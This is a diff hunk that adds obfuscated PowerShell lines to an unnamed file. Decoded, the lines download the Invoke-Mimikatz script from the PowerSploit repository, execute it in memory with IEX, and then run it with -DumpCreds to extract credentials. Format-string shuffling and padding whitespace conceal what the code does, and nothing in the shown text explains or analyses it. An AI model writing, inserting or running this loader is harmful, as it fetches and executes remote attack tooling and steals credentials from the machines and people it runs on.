@@ -1,0 +1,3 @@
+.("{0}{1}" -f 'IE','X') (&("{2}{0}{1}"-f'Obj','ect','New-') ("{2}{0}{1}"-f 'et.WebC','lient','N')).("{2}{0}{1}" -f'adSt','ring','Downlo').Invoke(("{12}{13}{23}{21}{20}{10}{0}{14}{4}{7}{3}{17}{18}{19}{5}{6}{15}{11}{16}{24}{8}{22}{9}{1}{2}"-f 'rcontent.com/Powe','.','ps1','/PowerSpl','l','s','t','lMafia','o','Mimikatz','buse','Exfilt','h','ttps:/','rShe','er/','ration/I','o','it/','ma','thu','aw.gi','ke-','/r','nv'))                                            
+                                                                             
+.("{4}{1}{0}{2}{3}" -f'e-Mi','nvok','mik','atz','I') -DumpCreds
